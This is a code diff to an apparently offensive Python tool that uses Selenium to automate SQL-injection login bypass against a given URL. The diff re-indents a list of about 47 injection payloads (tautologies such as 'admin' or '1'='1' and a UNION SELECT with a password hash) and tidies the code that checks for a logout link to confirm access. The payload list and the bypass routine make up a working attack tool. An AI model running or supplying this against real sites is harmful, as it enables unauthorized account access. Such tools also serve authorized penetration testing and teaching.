@@ -83,7 +83,7 @@ def bypass_auth(url, payloads):
                     print(colored("[*] Redirected to a potential dashboard page with payload.", 'green'))
 
                     try:
-                        logout_button = WebDriverWait(driver, 5).until(
+                        WebDriverWait(driver, 5).until(
                             EC.presence_of_element_located((By.XPATH, "//a[contains(., 'Logout')] | //button[contains(., 'Logout')]"))
                         )
                         print(colored("[*] Logout option detected. Access confirmed.", 'green'))
@@ -109,7 +109,7 @@ def bypass_auth(url, payloads):
     print(colored("[*] Browser will remain open for inspection.", 'blue'))
 
 def main():
-    banner = colored("""    
+    banner = colored(r"""    
    _____          __  .__   __________                                    
   /  _  \  __ ___/  |_|  |__\______   \___.__.___________    ______ ______
  /  /_\  \|  |  \   __\  |  \|    |  _<   |  |\____ \__  \  /  ___//  ___/
@@ -128,55 +128,55 @@ def main():
     args = parser.parse_args()
     url = args.url
 
-payloads = [
-    "or 1=1",
-    "or 1=1--",
-    "or 1=1#",
-    "or 1=1/*",
-    "admin' --",
-    "admin' #",
-    "admin'/*",
-    "admin' or '1'='1",
-    "admin' or '1'='1'--",
-    "admin' or '1'='1'#",
-    "admin' or '1'='1'/*",
-    "admin'or 1=1 or ''='",
-    "admin' or 1=1",
-    "admin' or 1=1--",
-    "admin' or 1=1#",
-    "admin' or 1=1/*",
-    "admin') or ('1'='1",
-    "admin') or ('1'='1'--",
-    "admin') or ('1'='1'#",
-    "admin') or ('1'='1'/*",
-    "admin') or '1'='1",
-    "admin') or '1'='1'--",
-    "admin') or '1'='1'#",
-    "admin') or '1'='1'/*",
-    "admin\" --",
-    "admin\" #",
-    "admin\"/*",
-    "admin\" or \"1\"=\"1",
-    "admin\" or \"1\"=\"1\"--",
-    "admin\" or \"1\"=\"1\"#",
-    "admin\" or \"1\"=\"1\"/*",
-    "admin\"or 1=1 or \"\"=\"",
-    "admin\" or 1=1",
-    "admin\" or 1=1--",
-    "admin\" or 1=1#",
-    "admin\" or 1=1/*",
-    "admin\") or (\"1\"=\"1",
-    "admin\") or (\"1\"=\"1\"--",
-    "admin\") or (\"1\"=\"1\"#",
-    "admin\") or (\"1\"=\"1\"/*",
-    "admin\") or \"1\"=\"1",
-    "admin\") or \"1\"=\"1\"--",
-    "admin\") or \"1\"=\"1\"#",
-    "admin\") or \"1\"=\"1\"/*",
-    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
-    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
-    "'or 1=1 limit 1-- -",
-]
+    payloads = [
+        "or 1=1",
+        "or 1=1--",
+        "or 1=1#",
+        "or 1=1/*",
+        "admin' --",
+        "admin' #",
+        "admin'/*",
+        "admin' or '1'='1",
+        "admin' or '1'='1'--",
+        "admin' or '1'='1'#",
+        "admin' or '1'='1'/*",
+        "admin'or 1=1 or ''='",
+        "admin' or 1=1",
+        "admin' or 1=1--",
+        "admin' or 1=1#",
+        "admin' or 1=1/*",
+        "admin') or ('1'='1",
+        "admin') or ('1'='1'--",
+        "admin') or ('1'='1'#",
+        "admin') or ('1'='1'/*",
+        "admin') or '1'='1",
+        "admin') or '1'='1'--",
+        "admin') or '1'='1'#",
+        "admin') or '1'='1'/*",
+        "admin\" --",
+        "admin\" #",
+        "admin\"/*",
+        "admin\" or \"1\"=\"1",
+        "admin\" or \"1\"=\"1\"--",
+        "admin\" or \"1\"=\"1\"#",
+        "admin\" or \"1\"=\"1\"/*",
+        "admin\"or 1=1 or \"\"=\"",
+        "admin\" or 1=1",
+        "admin\" or 1=1--",
+        "admin\" or 1=1#",
+        "admin\" or 1=1/*",
+        "admin\") or (\"1\"=\"1",
+        "admin\") or (\"1\"=\"1\"--",
+        "admin\") or (\"1\"=\"1\"#",
+        "admin\") or (\"1\"=\"1\"/*",
+        "admin\") or \"1\"=\"1",
+        "admin\") or \"1\"=\"1\"--",
+        "admin\") or \"1\"=\"1\"#",
+        "admin\") or \"1\"=\"1\"/*",
+        "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
+        "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
+        "'or 1=1 limit 1-- -",
+    ]
 
     print(colored("[*] Attempting authentication bypass on " + url, 'blue'))
     bypass_auth(url, payloads)
